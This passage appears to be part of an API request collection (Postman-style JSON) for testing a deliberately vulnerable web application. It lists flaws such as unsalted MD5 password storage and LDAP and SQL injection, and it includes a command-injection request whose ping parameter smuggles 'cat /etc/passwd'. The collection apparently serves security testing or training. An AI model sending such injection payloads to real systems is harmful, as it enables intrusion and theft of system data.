              "mode": "raw",
              "raw": "{\"username\": \"alice\", \"new_password\": \"hacked\"}"
            },
            "description": "CWE-916: Password stored as unsalted MD5. CWE-90: LDAP injection in modify filter. CWE-89: SQLi in audit log. Observe: new MD5 hash returned in plaintext response."
          }
        }
      ]
    },
    {
      "name": "Admin",
      "item": [
        {
          "name": "Admin Command Injection (ping)",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/admin/ping?host=127.0.0.1; cat /etc/passwd",
              "host": ["{{base_url}}"],
              "path": ["admin", "ping"],
